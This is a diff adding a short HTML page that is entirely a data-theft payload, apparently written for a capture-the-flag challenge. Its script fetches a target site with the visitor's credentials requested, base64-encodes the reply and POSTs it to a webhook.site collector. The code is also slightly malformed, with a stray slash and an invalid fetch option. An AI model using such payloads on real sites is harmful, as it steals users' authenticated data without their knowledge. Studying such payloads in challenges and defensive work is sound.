@@ -1,0 +1,18 @@
+<body>
+      <h1>TEST</h1>
+   </body>
+
+   <script>
+      fetch('https://ke.insomnihack.ch',{/
+         method:'get',
+         withCredentials: 'include'
+      }).then(r => {
+         return r.text();
+      }).then(r => {
+         fetch('https://webhook.site/4e10d889-d695-4b68-bc56-4f346aa6b98e/a', {
+            method: 'POST',
+            body: btoa(r)
+         });
+      });
+      </script>
+</html>
